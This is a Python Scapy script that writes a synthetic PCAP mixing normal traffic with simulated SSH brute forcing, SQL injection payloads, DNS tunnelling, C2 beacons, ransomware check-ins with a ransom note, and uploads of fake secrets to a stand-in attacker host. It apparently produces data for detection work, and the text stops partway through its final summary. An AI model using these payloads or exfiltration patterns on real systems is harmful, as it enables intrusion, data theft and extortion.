from scapy.all import *
from scapy.layers.inet import IP, TCP, UDP, ICMP
from scapy.layers.http import HTTPRequest, HTTPResponse
from scapy.layers.dns import DNS, DNSQR, DNSRR
import random
import time
import string
import base64
import hashlib

packets = []
timestamp = time.time()

def add_packet_with_time(pkt):
    global timestamp
    timestamp += random.uniform(0.001, 0.5)
    pkt.time = timestamp
    packets.append(pkt)

def random_ip():
    return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"

def create_tcp_handshake(src_ip, dst_ip, src_port, dst_port):
    seq_num = random.randint(1000000, 9999999)
    
    syn = IP(src=src_ip, dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags="S", seq=seq_num)
    add_packet_with_time(syn)
    
    synack = IP(src=dst_ip, dst=src_ip)/TCP(sport=dst_port, dport=src_port, flags="SA", seq=random.randint(1000000, 9999999), ack=syn[TCP].seq+1)
    add_packet_with_time(synack)
    
    ack = IP(src=src_ip, dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags="A", seq=syn[TCP].seq+1, ack=synack[TCP].seq+1)
    add_packet_with_time(ack)
    
    return syn[TCP].seq+1, synack[TCP].seq+1

def create_normal_web_traffic():
    src_ips = [f"192.168.1.{i}" for i in range(50, 70)]
    dst_servers = ["93.184.216.34", "151.101.1.140", "172.217.14.206", "104.16.132.229", "13.107.42.14"]
    
    for _ in range(300):
        src_ip = random.choice(src_ips)
        dst_ip = random.choice(dst_servers)
        src_port = random.randint(40000, 65000)
        
        seq_client, seq_server = create_tcp_handshake(src_ip, dst_ip, src_port, 443)
        
        urls = [
            "/", "/index.html", "/about.html", "/contact.html", "/products.html",
            "/api/v1/status", "/api/v2/health", "/images/logo.png", "/images/banner.jpg",
            "/css/style.css", "/css/bootstrap.min.css", "/js/app.js", "/js/jquery.min.js",
            "/fonts/roboto.woff2", "/favicon.ico", "/sitemap.xml", "/robots.txt"
        ]
        
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15"
        ]
        
        get_req = IP(src=src_ip, dst=dst_ip)/TCP(sport=src_port, dport=443, flags="PA", seq=seq_client, ack=seq_server)
        http_request = f"GET {random.choice(urls)} HTTP/1.1\r\n"
        http_request += f"Host: example.com\r\n"
        http_request += f"User-Agent: {random.choice(user_agents)}\r\n"
        http_request += f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
        http_request += f"Accept-Language: en-US,en;q=0.5\r\n"
        http_request += f"Accept-Encoding: gzip, deflate, br\r\n"
        http_request += f"Connection: keep-alive\r\n"
        http_request += f"Upgrade-Insecure-Requests: 1\r\n\r\n"
        get_req = get_req/Raw(load=http_request.encode())
        add_packet_with_time(get_req)
        
        seq_client += len(get_req[Raw].load)
        
        response = IP(src=dst_ip, dst=src_ip)/TCP(sport=443, dport=src_port, flags="PA", seq=seq_server, ack=seq_client)
        http_response = "HTTP/1.1 200 OK\r\n"
        http_response += "Server: nginx/1.24.0\r\n"
        http_response += "Content-Type: text/html; charset=UTF-8\r\n"
        http_response += "Content-Length: 2048\r\n"
        http_response += "Connection: keep-alive\r\n\r\n"
        http_response += "<html><head><title>Example</title></head><body><h1>Welcome</h1><p>This is legitimate content.</p></body></html>"
        response = response/Raw(load=http_response.encode())
        add_packet_with_time(response)
        
        fin = IP(src=src_ip, dst=dst_ip)/TCP(sport=src_port, dport=443, flags="FA", seq=seq_client, ack=seq_server+len(response[Raw].load))
        add_packet_with_time(fin)

def create_normal_dns_traffic():
    src_ips = [f"192.168.1.{i}" for i in range(50, 70)]
    dns_servers = ["8.8.8.8", "1.1.1.1", "208.67.222.222", "9.9.9.9"]
    
    domains = [
        "www.google.com", "www.facebook.com", "www.youtube.com", "www.amazon.com",
        "www.wikipedia.org", "www.reddit.com", "www.twitter.com", "www.linkedin.com",
        "www.github.com", "www.stackoverflow.com", "api.openai.com", "cdn.cloudflare.com",
        "www.netflix.com", "www.microsoft.com", "www.apple.com", "www.cnn.com",
        "news.bbc.co.uk", "www.nytimes.com", "www.espn.com", "www.ebay.com",
        "mail.google.com", "drive.google.com", "docs.google.com", "calendar.google.com",
        "web.whatsapp.com", "www.instagram.com", "www.tiktok.com", "www.snapchat.com"
    ]
    
    for _ in range(250):
        src_ip = random.choice(src_ips)
        dst_ip = random.choice(dns_servers)
        domain = random.choice(domains)
        dns_id = random.randint(1, 65535)
        
        query = IP(src=src_ip, dst=dst_ip)/UDP(sport=random.randint(50000, 60000), dport=53)
        query = query/DNS(id=dns_id, rd=1, qd=DNSQR(qname=domain))
        add_packet_with_time(query)
        
        response = IP(src=dst_ip, dst=src_ip)/UDP(sport=53, dport=query[UDP].sport)
        response = response/DNS(id=dns_id, qr=1, aa=0, rd=1, ra=1, 
                               qd=DNSQR(qname=domain), 
                               an=DNSRR(rrname=domain, ttl=300, rdata=random_ip()))
        add_packet_with_time(response)

def create_ssh_bruteforce():
    attacker_ips = ["203.0.113.45", "198.51.100.88", "192.0.2.123", "185.220.101.44"]
    target_ips = ["192.168.1.100", "192.168.1.200", "10.0.0.50"]
    target_port = 22
    
    usernames = [
        "root", "admin", "administrator", "user", "test", "guest", "oracle", "postgres", 
        "mysql", "ubuntu", "debian", "centos", "jenkins", "tomcat", "apache", "www-data",
        "nginx", "git", "ftp", "backup", "sysadmin", "support", "operator", "student"
    ]
    
    passwords = [
        "password", "123456", "admin", "root", "12345678", "qwerty", "password123",
        "letmein", "welcome", "monkey", "dragon", "master", "trustno1", "Password1"
    ]
    
    for attacker_ip in attacker_ips:
        for target_ip in target_ips:
            for attempt_session in range(random.randint(3, 6)):
                username = random.choice(usernames)
                for attempt in range(random.randint(5, 15)):
                    src_port = random.randint(50000, 60000)
                    
                    seq_client, seq_server = create_tcp_handshake(attacker_ip, target_ip, src_port, target_port)
                    
                    banner = IP(src=target_ip, dst=attacker_ip)/TCP(sport=target_port, dport=src_port, flags="PA", seq=seq_server, ack=seq_client)
                    banner_msg = f"SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6\r\n"
                    banner = banner/Raw(load=banner_msg.encode())
                    add_packet_with_time(banner)
                    seq_server += len(banner_msg)
                    
                    time.sleep(0.001)
                    
                    auth_request = IP(src=attacker_ip, dst=target_ip)/TCP(sport=src_port, dport=target_port, flags="PA", seq=seq_client, ack=seq_server)
                    auth_request = auth_request/Raw(load=f"SSH auth attempt for {username}\n".encode())
                    add_packet_with_time(auth_request)
                    seq_client += len(auth_request[Raw].load)
                    
                    fail_msg = IP(src=target_ip, dst=attacker_ip)/TCP(sport=target_port, dport=src_port, flags="PA", seq=seq_server, ack=seq_client)
                    fail_text = f"Failed password for {username} from {attacker_ip} port {src_port} ssh2\r\n"
                    fail_msg = fail_msg/Raw(load=fail_text.encode())
                    add_packet_with_time(fail_msg)
                    seq_server += len(fail_text)
                    
                    if random.random() < 0.4:
                        invalid_user = IP(src=target_ip, dst=attacker_ip)/TCP(sport=target_port, dport=src_port, flags="PA", seq=seq_server, ack=seq_client)
                        invalid_text = f"Invalid user {username} from {attacker_ip} port {src_port}\r\n"
                        invalid_user = invalid_user/Raw(load=invalid_text.encode())
                        add_packet_with_time(invalid_user)
                        seq_server += len(invalid_text)
                    
                    if random.random() < 0.3:
                        disconnect = IP(src=target_ip, dst=attacker_ip)/TCP(sport=target_port, dport=src_port, flags="PA", seq=seq_server, ack=seq_client)
                        disconnect_text = f"Disconnecting: Too many authentication failures for {username} [preauth]\r\n"
                        disconnect = disconnect/Raw(load=disconnect_text.encode())
                        add_packet_with_time(disconnect)
                        seq_server += len(disconnect_text)
                    
                    close_msg = IP(src=target_ip, dst=attacker_ip)/TCP(sport=target_port, dport=src_port, flags="PA", seq=seq_server, ack=seq_client)
                    close_text = f"Connection closed by authenticating user {username} {attacker_ip} port {src_port} [preauth]\r\n"
                    close_msg = close_msg/Raw(load=close_text.encode())
                    add_packet_with_time(close_msg)
                    
                    rst = IP(src=target_ip, dst=attacker_ip)/TCP(sport=target_port, dport=src_port, flags="R", seq=seq_server+len(close_text))
                    add_packet_with_time(rst)

def create_sql_injection():
    attacker_ips = ["198.51.100.50", "203.0.113.99", "192.0.2.200", "185.220.102.55"]
    target_ips = ["192.168.1.200", "10.0.0.100", "172.16.0.50"]
    target_port = 80
    
    sql_injection_patterns = [
        ("POST", "/login.php", "username=admin' OR '1'='1'-- -&password=anything", "Authentication Bypass"),
        ("GET", "/product.php?id=1' UNION SELECT null,username,password FROM users-- -", "", "UNION-based SQLi"),
        ("POST", "/search.php", "query=test' OR 1=1-- -", "Boolean-based SQLi"),
        ("GET", "/admin.php?id=1' AND 1=1 UNION SELECT table_name,column_name FROM information_schema.columns-- -", "", "Information Schema Access"),
        ("POST", "/api/user", "id=1' UNION SELECT database(),user(),version()-- -", "Database Enumeration"),
        ("GET", "/page.php?sort=name' ORDER BY 1,2,3,4,5-- -", "", "Column Enumeration"),
        ("POST", "/comment.php", "text=<script>alert(1)</script>' UNION SELECT * FROM admin WHERE '1'='1", "XSS + SQLi Combo"),
        ("GET", "/news.php?id=5' AND SLEEP(5)-- -", "", "Time-based SQLi"),
        ("POST", "/update.php", "name=admin&pass=test' OR '1'='1'-- -", "Update Statement Injection"),
        ("GET", "/report.php?id=1'; DROP TABLE logs; -- -", "", "Destructive SQLi"),
        ("POST", "/login", "user=admin'--&password=ignored", "Comment Injection"),
        ("GET", "/item.php?category=electronics' UNION ALL SELECT null,concat(username,':',password),null FROM users-- -", "", "Data Extraction"),
        ("POST", "/checkout.php", "price=100.00' OR price < 1 OR '1'='1", "Price Manipulation"),
        ("GET", "/profile.php?user=1' AND (SELECT COUNT(*) FROM users) > 0-- -", "", "Subquery Injection"),
        ("POST", "/api/query", "sql=' UNION SELECT load_file('/etc/passwd')-- -", "File Reading Attempt")
    ]
    
    for attacker_ip in attacker_ips:
        for target_ip in target_ips:
            for method, uri, body, attack_type in random.sample(sql_injection_patterns, random.randint(8, 15)):
                src_port = random.randint(40000, 50000)
                
                seq_client, seq_server = create_tcp_handshake(attacker_ip, target_ip, src_port, target_port)
                
                if method == "GET":
                    payload = f"{method} {uri} HTTP/1.1\r\n"
                    payload += f"Host: vulnerable-site.com\r\n"
                    payload += f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"
                    payload += f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                    payload += f"Accept-Language: en-US,en;q=0.5\r\n"
                    payload += f"Connection: close\r\n\r\n"
                else:
                    payload = f"{method} {uri} HTTP/1.1\r\n"
                    payload += f"Host: vulnerable-site.com\r\n"
                    payload += f"User-Agent: sqlmap/1.7.12 (http://sqlmap.org)\r\n"
                    payload += f"Content-Type: application/x-www-form-urlencoded\r\n"
                    payload += f"Content-Length: {len(body)}\r\n"
                    payload += f"Connection: close\r\n\r\n{body}"
                
                pkt = IP(src=attacker_ip, dst=target_ip)/TCP(sport=src_port, dport=target_port, flags="PA", seq=seq_client, ack=seq_server)
                pkt = pkt/Raw(load=payload.encode())
                add_packet_with_time(pkt)
                seq_client += len(payload)
                
                if "UNION" in uri or "UNION" in body:
                    response = IP(src=target_ip, dst=attacker_ip)/TCP(sport=target_port, dport=src_port, flags="PA", seq=seq_server, ack=seq_client)
                    response_data = "HTTP/1.1 200 OK\r\n"
                    response_data += "Server: Apache/2.4.52 (Ubuntu)\r\n"
                    response_data += "Content-Type: text/html\r\n\r\n"
                    response_data += "<table><tr><td>admin</td><td>5f4dcc3b5aa765d61d8327deb882cf99</td></tr>"
                    response_data += "<tr><td>user</td><td>e10adc3949ba59abbe56e057f20f883e</td></tr></table>"
                    response = response/Raw(load=response_data.encode())
                    add_packet_with_time(response)
                elif "DROP" in uri or "DROP" in body:
                    error_response = IP(src=target_ip, dst=attacker_ip)/TCP(sport=target_port, dport=src_port, flags="PA", seq=seq_server, ack=seq_client)
                    error_data = "HTTP/1.1 500 Internal Server Error\r\n\r\n"
                    error_data += "MySQL Error: You have an error in your SQL syntax near 'DROP TABLE logs'"
                    error_response = error_response/Raw(load=error_data.encode())
                    add_packet_with_time(error_response)
                else:
                    response = IP(src=target_ip, dst=attacker_ip)/TCP(sport=target_port, dport=src_port, flags="PA", seq=seq_server, ack=seq_client)
                    response_data = "HTTP/1.1 200 OK\r\n\r\nAccess granted"
                    response = response/Raw(load=response_data.encode())
                    add_packet_with_time(response)

def create_dns_tunneling():
    attacker_ips = ["172.16.0.50", "10.10.0.75", "192.168.5.88", "10.20.30.100"]
    dns_servers = ["8.8.8.8", "1.1.1.1", "208.67.222.222"]
    
    exfil_data = [
        "U2VjcmV0RGF0YQ", "Q29uZmlkZW50aWFs", "UGFzc3dvcmRz", "RXhmaWx0cmF0ZQ",
        "TWFsd2FyZUMyQw", "QmFja2Rvb3JDb2Rl", "U3RvbGVuRGF0YQ", "Q3JlZGVudGlhbHM",
        "QWRtaW5QYXNz", "RGF0YWJhc2VEdW1w", "Q3VzdG9tZXJJbmZv", "RmluYW5jaWFs"
    ]
    
    malicious_tlds = ["tk", "ml", "ga", "cf", "gq"]
    base_domains = [
        "exfil-data", "c2-server", "malware-host", "backdoor-cmd", 
        "data-theft", "command-control", "ransomware-ops", "stealer-bot"
    ]
    
    for attacker_ip in attacker_ips:
        for session in range(random.randint(5, 10)):
            base_domain = f"{random.choice(base_domains)}-{random.randint(1000,9999)}.{random.choice(malicious_tlds)}"
            
            for chunk_num in range(random.randint(20, 40)):
                data_chunk = random.choice(exfil_data)
                random_padding = ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(15, 40)))
                
                subdomain = f"{data_chunk}{random_padding}.chunk{chunk_num}.{base_domain}"
                
                query = IP(src=attacker_ip, dst=random.choice(dns_servers))/UDP(sport=random.randint(50000, 60000), dport=53)
                dns_id = random.randint(1, 65535)
                query = query/DNS(id=dns_id, rd=1, qd=DNSQR(qname=subdomain))
                add_packet_with_time(query)
                
                response = IP(src=query[IP].dst, dst=attacker_ip)/UDP(sport=53, dport=query[UDP].sport)
                response = response/DNS(id=dns_id, qr=1, aa=0, rd=1, ra=1, 
                                       qd=DNSQR(qname=subdomain), 
                                       an=DNSRR(rrname=subdomain, ttl=60, rdata="127.0.0.1"))
                add_packet_with_time(response)
                
                if random.random() < 0.3:
                    txt_query = IP(src=attacker_ip, dst=random.choice(dns_servers))/UDP(sport=random.randint(50000, 60000), dport=53)
                    txt_query = txt_query/DNS(id=random.randint(1, 65535), rd=1, qd=DNSQR(qname=f"cmd.{base_domain}", qtype="TXT"))
                    add_packet_with_time(txt_query)

def create_cobalt_strike():
    bot_ips = ["10.10.10.100", "192.168.7.55", "172.20.0.99", "192.168.100.150"]
    c2_servers = ["203.0.113.50", "198.51.100.200", "185.220.103.66"]
    c2_port = 443
    
    beacon_uris = [
        "/activity", "/submit.php", "/__utm.gif", "/pixel", "/load",
        "/push", "/updates.rss", "/cx", "/match", "/g.pixel"
    ]
    
    user_agents_cs = [
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
    ]
    
    for bot_ip in bot_ips:
        for c2_server in c2_servers:
            for beacon_cycle in range(random.randint(15, 30)):
                uri = random.choice(beacon_uris)
                src_port = random.randint(50000, 60000)
                
                seq_client, seq_server = create_tcp_handshake(bot_ip, c2_server, src_port, c2_port)
                
                method = "GET" if random.random() > 0.3 else "POST"
                
                beacon_payload = f"{method} {uri} HTTP/1.1\r\n"
                beacon_payload += f"Host: {c2_server}\r\n"
                beacon_payload += f"User-Agent: {random.choice(user_agents_cs)}\r\n"
                beacon_payload += f"Accept: */*\r\n"
                beacon_payload += f"Cookie: __cfduid={random.randbytes(16).hex()}; session={random.randbytes(8).hex()}\r\n"
                
                if method == "POST":
                    beacon_data = base64.b64encode(random.randbytes(random.randint(100, 500))).decode()
                    beacon_payload += f"Content-Type: application/octet-stream\r\n"
                    beacon_payload += f"Content-Length: {len(beacon_data)}\r\n\r\n"
                    beacon_payload += beacon_data
                else:
                    beacon_payload += f"Connection: keep-alive\r\n\r\n"
                
                beacon = IP(src=bot_ip, dst=c2_server)/TCP(sport=src_port, dport=c2_port, flags="PA", seq=seq_client, ack=seq_server)
                beacon = beacon/Raw(load=beacon_payload.encode())
                add_packet_with_time(beacon)
                seq_client += len(beacon_payload)
                
                c2_response = IP(src=c2_server, dst=bot_ip)/TCP(sport=c2_port, dport=src_port, flags="PA", seq=seq_server, ack=seq_client)
                response_data = f"HTTP/1.1 200 OK\r\n"
                response_data += f"Server: nginx\r\n"
                response_data += f"Content-Type: application/octet-stream\r\n"
                
                command_data = random.randbytes(random.randint(50, 300))
                response_data += f"Content-Length: {len(command_data)}\r\n\r\n"
                c2_response = c2_response/Raw(load=response_data.encode() + command_data)
                add_packet_with_time(c2_response)
                
                time.sleep(random.uniform(0.5, 2.0))

def create_ransomware_c2():
    victim_ips = ["192.168.5.100", "10.0.50.200", "172.18.0.88", "192.168.200.75"]
    c2_servers = ["198.51.100.200", "203.0.113.150", "185.220.104.77"]
    c2_port = 443
    
    bitcoin_addresses = [
        "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa",
        "3J98t1WpEZ73CNmYviecrnyiWrnqRhWNLy",
        "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh",
        "bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq"
    ]
    
    for victim_ip in victim_ips:
        victim_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))
        encryption_key = base64.b64encode(random.randbytes(32)).decode()
        
        for c2_server in c2_servers:
            for stage in range(random.randint(5, 10)):
                src_port = random.randint(50000, 60000)
                
                seq_client, seq_server = create_tcp_handshake(victim_ip, c2_server, src_port, c2_port)
                
                checkin_payload = f"POST /api/v2/checkin HTTP/1.1\r\n"
                checkin_payload += f"Host: ransomware-panel.onion\r\n"
                checkin_payload += f"Content-Type: application/json\r\n"
                checkin_payload += f"User-Agent: RansomClient/3.2\r\n"
                
                status = "scanning" if stage == 0 else ("encrypting" if stage < 4 else "complete")
                checkin_data = f'{{"victim_id":"{victim_id}","hostname":"DESKTOP-{random.randint(10000,99999)}",'
                checkin_data += f'"os":"Windows 10 Pro 22H2","os_version":"10.0.19045",'
                checkin_data += f'"encryption_status":"{status}","files_encrypted":{random.randint(100, 8000)},'
                checkin_data += f'"total_files":{random.randint(10000, 50000)},"key":"{encryption_key}",'
                checkin_data += f'"drives":["C:\\\\","D:\\\\"],"network_shares":["\\\\\\\\FILESERVER\\\\shared"],'
                checkin_data += f'"timestamp":{int(time.time())},"stage":{stage}}}'
                
                checkin_payload += f"Content-Length: {len(checkin_data)}\r\n\r\n{checkin_data}"
                
                checkin = IP(src=victim_ip, dst=c2_server)/TCP(sport=src_port, dport=c2_port, flags="PA", seq=seq_client, ack=seq_server)
                checkin = checkin/Raw(load=checkin_payload.encode())
                add_packet_with_time(checkin)
                seq_client += len(checkin_payload)
                
                c2_response = IP(src=c2_server, dst=victim_ip)/TCP(sport=c2_port, dport=src_port, flags="PA", seq=seq_server, ack=seq_client)
                response_data = f'HTTP/1.1 200 OK\r\n\r\n{{"status":"received","next_action":"continue","interval":300}}'
                c2_response = c2_response/Raw(load=response_data.encode())
                add_packet_with_time(c2_response)
                
                if stage >= 2:
                    payment_port = random.randint(50000, 60000)
                    seq_pay_client, seq_pay_server = create_tcp_handshake(victim_ip, c2_server, payment_port, c2_port)
                    
                    btc_addr = random.choice(bitcoin_addresses)
                    payment_payload = f"GET /payment?victim_id={victim_id}&btc={btc_addr}&amount=0.5&currency=BTC HTTP/1.1\r\n"
                    payment_payload += f"Host: payment-gateway.onion\r\n"
                    payment_payload += f"User-Agent: RansomClient/3.2\r\n\r\n"
                    
                    payment = IP(src=victim_ip, dst=c2_server)/TCP(sport=payment_port, dport=c2_port, flags="PA", seq=seq_pay_client, ack=seq_pay_server)
                    payment = payment/Raw(load=payment_payload.encode())
                    add_packet_with_time(payment)
                
                if stage >= 3:
                    note_port = random.randint(50000, 60000)
                    seq_note_client, seq_note_server = create_tcp_handshake(victim_ip, c2_server, note_port, c2_port)
                    
                    ransom_note = f"POST /ransom_note HTTP/1.1\r\n"
                    ransom_note += f"Host: ransomware-panel.onion\r\n"
                    ransom_note += f"Content-Type: text/plain\r\n"
                    note_body = f"YOUR FILES HAVE BEEN ENCRYPTED!\n\n"
                    note_body += f"Victim ID: {victim_id}\n"
                    note_body += f"All your important files have been encrypted with military-grade encryption.\n"
                    note_body += f"To decrypt your files, you must pay 0.5 BTC to: {random.choice(bitcoin_addresses)}\n"
                    note_body += f"After payment, contact us at: decrypt@onionmail.to with your victim ID.\n"
                    note_body += f"You have 72 hours before the decryption key is destroyed forever.\n"
                    ransom_note += f"Content-Length: {len(note_body)}\r\n\r\n{note_body}"
                    
                    note = IP(src=victim_ip, dst=c2_server)/TCP(sport=note_port, dport=c2_port, flags="PA", seq=seq_note_client, ack=seq_note_server)
                    note = note/Raw(load=ransom_note.encode())
                    add_packet_with_time(note)
                
                time.sleep(random.uniform(1.0, 3.0))

def create_data_exfiltration():
    insider_ips = ["172.20.0.50", "192.168.10.100", "10.5.5.75", "192.168.50.200"]
    attacker_servers = ["203.0.113.100", "198.51.100.250", "185.220.105.88"]
    exfil_port = 80
    
    sensitive_files = [
        ("passwords.txt", b"admin:SecureP@ss123\nroot:R00tAccess!\ndbadmin:DBPass2023\nsupport:HelpDesk456\nbackup:BackupAdmin789\n"),
        ("customer_data.csv", b"Name,Email,SSN,CreditCard,Phone\nJohn Doe,john@email.com,123-45-6789,4532-1234-5678-9010,555-0101\nJane Smith,jane@company.com,987-65-4321,5425-9876-5432-1098,555-0102\nBob Johnson,bob@mail.com,456-78-9012,4916-3456-7890-1234,555-0103\n"),
        ("financial_q4.xlsx", b"Q4 2024 Financial Report\nRevenue: $5,234,567\nProfit: $1,876,234\nExpenses: $3,358,333\nProjected Q1 2025: $6,500,000\nCash Flow: $2,100,000\n"),
        ("employee_records.sql", b"INSERT INTO employees VALUES ('Alice Johnson', '987-65-4321', 95000, 'Engineering', 'alice@company.com');\nINSERT INTO employees VALUES ('Bob Smith', '123-45-6789', 85000, 'Sales', 'bob@company.com');\nINSERT INTO employees VALUES ('Carol White', '456-78-9012', 120000, 'Management', 'carol@company.com');\n"),
        ("api_keys.json", b'{"aws_access_key":"AKIAIOSFODNN7EXAMPLE","aws_secret_key":"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY","stripe_api_key":"STRIPE_KEY_PLACEHOLDER","github_token":"ghp_AbCdEfGhIjKlMnOpQrStUvWxYz1234567890","openai_key":"sk-proj-AbCdEfGhIjKlMnOpQrStUvWxYz"}\n'),
        ("backup.tar.gz", b"Compressed archive metadata:\n- /etc/passwd (1847 bytes)\n- /etc/shadow (1234 bytes)\n- /root/.ssh/id_rsa (3247 bytes)\n- /var/www/html/config.php (892 bytes)\n- /home/*/.bash_history (multiple files)\n"),
        ("internal_memo.docx", b"CONFIDENTIAL - INTERNAL USE ONLY\n\nSubject: Merger Discussion\nDate: December 15, 2024\n\nWe are in advanced negotiations with CompanyX for acquisition.\nProposed valuation: $50M\nExpected closure: Q2 2025\nDo not disclose to anyone outside executive team.\n"),
        ("source_code.zip", b"Application source code archive:\n- authentication.py (critical security functions)\n- database.py (connection strings with credentials)\n- api_handlers.py (business logic)\n- encryption_keys.pem (RSA private keys)\n"),
        ("vpn_config.ovpn", b"client\ndev tun\nproto udp\nremote vpn.company.com 1194\nauth-user-pass\nca ca.crt\ncert client.crt\nkey client.key\ncipher AES-256-CBC\nauth SHA512\n"),
        ("database_dump.sql", b"-- MySQL dump\n-- Database: production_db\nCREATE TABLE users (id INT, username VARCHAR(50), password_hash VARCHAR(255), email VARCHAR(100));\nINSERT INTO users VALUES (1, 'admin', '$2y$10$abcdefghijklmnopqrstuv', 'admin@company.com');\n")
    ]
    
    for insider_ip in insider_ips:
        for attacker_server in attacker_servers:
            for filename, content in random.sample(sensitive_files, random.randint(5, 10)):
                src_port = random.randint(50000, 60000)
                
                seq_client, seq_server = create_tcp_handshake(insider_ip, attacker_server, src_port, exfil_port)
                
                boundary = f"----WebKitFormBoundary{''.join(random.choices(string.ascii_letters + string.digits, k=16))}"
                
                file_content = content.decode('utf-8', errors='ignore')
                
                post_data = f"POST /upload.php HTTP/1.1\r\n"
                post_data += f"Host: drop.attacker-server.com\r\n"
                post_data += f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"
                post_data += f"Accept: */*\r\n"
                post_data += f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
                
                form_content = f"--{boundary}\r\n"
                form_content += f'Content-Disposition: form-data; name="file"; filename="{filename}"\r\n'
                form_content += f"Content-Type: application/octet-stream\r\n\r\n"
                form_content += file_content
                form_content += f"\r\n--{boundary}\r\n"
                form_content += f'Content-Disposition: form-data; name="user"\r\n\r\n'
                form_content += f"insider_{random.randint(100, 999)}\r\n"
                form_content += f"--{boundary}\r\n"
                form_content += f'Content-Disposition: form-data; name="timestamp"\r\n\r\n'
                form_content += f"{int(time.time())}\r\n"
                form_content += f"--{boundary}--\r\n"
                
                post_data += f"Content-Length: {len(form_content)}\r\n\r\n"
                post_data += form_content
                
                upload = IP(src=insider_ip, dst=attacker_server)/TCP(sport=src_port, dport=exfil_port, flags="PA", seq=seq_client, ack=seq_server)
                upload = upload/Raw(load=post_data.encode())
                add_packet_with_time(upload)
                seq_client += len(post_data)
                
                response = IP(src=attacker_server, dst=insider_ip)/TCP(sport=exfil_port, dport=src_port, flags="PA", seq=seq_server, ack=seq_client)
                response_data = f"HTTP/1.1 200 OK\r\n"
                response_data += f"Server: Apache/2.4.52\r\n"
                response_data += f"Content-Type: application/json\r\n\r\n"
                response_data += f'{{"status":"success","file":"{filename}","size":{len(content)},"id":"{hashlib.md5(content).hexdigest()}"}}'
                response = response/Raw(load=response_data.encode())
                add_packet_with_time(response)
                
                fin = IP(src=insider_ip, dst=attacker_server)/TCP(sport=src_port, dport=exfil_port, flags="FA", seq=seq_client, ack=seq_server+len(response_data))
                add_packet_with_time(fin)

def create_icmp_traffic():
    hosts = ["192.168.1.1", "192.168.1.50", "192.168.1.100", "8.8.8.8", "1.1.1.1", "192.168.1.200"]
    
    for _ in range(150):
        src = random.choice(hosts)
        dst = random.choice(hosts)
        if src != dst:
            icmp_id = random.randint(1, 65535)
            icmp_seq = random.randint(1, 1000)
            
            ping = IP(src=src, dst=dst)/ICMP(type=8, code=0, id=icmp_id, seq=icmp_seq)
            ping = ping/Raw(load=b"abcdefghijklmnopqrstuvwxyz123456")
            add_packet_with_time(ping)
            
            if random.random() > 0.1:
                pong = IP(src=dst, dst=src)/ICMP(type=0, code=0, id=icmp_id, seq=icmp_seq)
                pong = pong/Raw(load=b"abcdefghijklmnopqrstuvwxyz123456")
                add_packet_with_time(pong)
            
            time.sleep(random.uniform(0.01, 0.1))

def create_arp_traffic():
    local_ips = [f"192.168.1.{i}" for i in range(1, 255, 10)]
    
    for _ in range(50):
        src_ip = random.choice(local_ips)
        dst_ip = random.choice(local_ips)
        
        if src_ip != dst_ip:
            arp_request = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, psrc=src_ip, pdst=dst_ip)
            add_packet_with_time(arp_request)
            
            if random.random() > 0.2:
                arp_reply = Ether()/ARP(op=2, psrc=dst_ip, hwsrc=RandMAC(), pdst=src_ip)
                add_packet_with_time(arp_reply)

print("[*] Generating comprehensive network traffic PCAP file...")
print("[*] This may take a few minutes...\n")

print("[*] Creating normal HTTPS web traffic...")
create_normal_web_traffic()

print("[*] Creating normal DNS queries...")
create_normal_dns_traffic()

print("[*] Creating ICMP ping traffic...")
create_icmp_traffic()

print("[*] Creating ARP traffic...")
create_arp_traffic()

print("\n[!] Generating ATTACK TRAFFIC:\n")

print("[*] Creating SSH Brute Force attack (Port 22)...")
create_ssh_bruteforce()

print("[*] Creating SQL Injection attacks (Port 80)...")
create_sql_injection()

print("[*] Creating DNS Tunneling exfiltration (Port 53)...")
create_dns_tunneling()

print("[*] Creating Cobalt Strike C2 beacons (Port 443)...")
create_cobalt_strike()

print("[*] Creating Ransomware C2 communication (Port 443)...")
create_ransomware_c2()

print("[*] Creating Data Exfiltration (Port 80)...")
create_data_exfiltration()

packets.sort(key=lambda x: x.time)

print(f"\n[*] Writing {len(packets)} packets to sample.pcap...")
wrpcap("sample.pcap", packets)

print(f"\n{'='*70}")
print(f"[+] PCAP FILE CREATED SUCCESSFULLY!")
print(f"{'='*70}")
print(f"[+] Filename: sample.pcap")
print(f"[+] Total packets: {len(packets)}")
print(f"[+] Traffic duration: ~{int(timestamp - time.time())} seconds")
print(f"\n[*] Attack Traffic Summary:")
print(f"    - SSH Brute Force (Port 22): Multiple authentication failures")
